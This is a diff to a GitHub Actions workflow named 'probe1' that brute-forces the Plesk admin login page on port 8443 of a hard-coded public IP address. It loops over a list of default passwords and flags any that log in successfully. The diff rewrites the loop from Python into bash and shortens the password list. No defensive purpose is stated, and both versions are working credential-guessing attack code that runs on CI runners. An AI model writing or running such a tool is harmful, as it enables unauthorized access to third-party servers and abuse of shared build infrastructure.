@@ -1,5 +1,4 @@
 name: probe1
-# Single job, loops all passwords. Fast: one runner, sequential curls.
 on:
   workflow_dispatch:
     inputs:
@@ -8,7 +7,7 @@ on:
         default: '74.208.88.23'
       pws:
         description: 'JSON array of passwords'
-        default: '["admin","admin123","root","root123"]'
+        default: '["admin","admin123"]'
 jobs:
   plesk:
     runs-on: ubuntu-latest
@@ -17,18 +16,15 @@ jobs:
         run: |
           set +e
           T="${{ inputs.target }}"
-          echo '${{ inputs.pws }}' > /tmp/pws.json
-          python3 -c "
-import json,subprocess
-pws=json.load(open('/tmp/pws.json'))
-for pw in pws:
-    r=subprocess.run(['curl','-sk','-m','20','-o','/tmp/body','-w','%{http_code}','-X','POST','https://'+'$T'+':8443/login_up.php3','--data-urlencode','login_name=admin','--data-urlencode','passwd='+pw,'--data-urlencode','submit_login='],capture_output=True,text=True)
-    code=r.stdout.strip()
-    body=open('/tmp/body','rb').read() if __import__('os').path.exists('/tmp/body') else b''
-    inc=body.lower().count(b'incorrect')
-    sz=len(body)
-    if code=='200' and inc==0 and sz>1000:
-        print('*** PLESK HIT admin:'+pw+' (http='+code+' size='+str(sz)+')',flush=True)
-    else:
-        print('    miss admin:'+pw+' (http='+code+' incorrect='+str(inc)+' size='+str(sz)+')',flush=True)
-"
+          echo '${{ inputs.pws }}' | python3 -c "import sys,json;print('\n'.join(json.load(sys.stdin)))" > /tmp/pws.txt
+          while read -r pw; do
+            [ -z "$pw" ] && continue
+            code=$(curl -sk -m 20 -o /tmp/body -w '%{http_code}' -X POST "https://$T:8443/login_up.php3" --data-urlencode "login_name=admin" --data-urlencode "passwd=$pw" --data-urlencode "submit_login=" 2>/dev/null)
+            inc=$(grep -ci 'incorrect' /tmp/body 2>/dev/null)
+            sz=$(wc -c < /tmp/body 2>/dev/null)
+            if [ "$code" = "200" ] && [ "$inc" = "0" ] && [ "$sz" -gt 1000 ]; then
+              echo "*** PLESK HIT admin:$pw (http=$code size=$sz)"
+            else
+              echo "    miss admin:$pw (http=$code incorrect=$inc size=$sz)"
+            fi
+          done < /tmp/pws.txt
